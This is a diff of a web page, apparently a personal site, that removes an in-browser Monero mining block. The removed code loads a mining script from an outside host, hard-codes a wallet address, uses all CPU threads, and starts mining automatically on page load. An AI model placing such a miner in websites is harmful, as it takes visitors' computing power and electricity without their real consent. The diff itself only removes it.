@@ -455,60 +455,6 @@ ABQAEwCAQEBA////AiaEj6HL6MBieEkueuzFUE/ufVjIdVpJgh66qqdrse/Y0jOV2jEsFQA7";
     <script>
         (adsbygoogle = window.adsbygoogle || []).push({});
     </script>
-    <div class="miner-outerbox">
-      <h1>Help Me Mine Monero</h1>
-      <button id="stop-button" style="margin-left: 38% "><span class="default">Stop</span></button>
-      <p>
-        <textarea rows='10' cols='40' id="texta" style="margin-left: 17% "></textarea>
-      </p>
-    </div>
-
-    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-    <script src="https://xmr.omine.org/assets/v7.js"></script>
-    <script>
-      var isGo = true;
-      var timeout;
-
-      function addText(e) {
-
-        var t = document.getElementById("texta");
-
-        "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
-
-      }
-      function miner() {
-        OMINE("46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz#WebMiner", "-1"), //-1 means use all cpu threads
-          throttleMiner = 10,
-          addText("Connecting..."),
-          timeout = setInterval(function () {
-            for (;
-              sendStack.length > 0;
-            ) addText(sendStack.pop());
-            for (;
-              receiveStack.length > 0;
-            ) addText(receiveStack.pop());
-            addText("calculated " + totalhashes + " hashes.")
-          }
-            , 2e3);
-      }
-
-      miner();
-      $("#stop-button").click(function () {
-        if (isGo) {
-          $(this).html('<span class="start">Continue</span>');
-          stopMining();
-          clearInterval(timeout);
-          addText("Stopped mining...\nOK");
-        }
-        else {
-          $(this).html('<span class="stop">Stop</span>');
-          miner();
-        }
-        isGo = !isGo;
-      }
-
-      );
-    </script>
     <h1>&nbsp;</h1>
   </div>
 
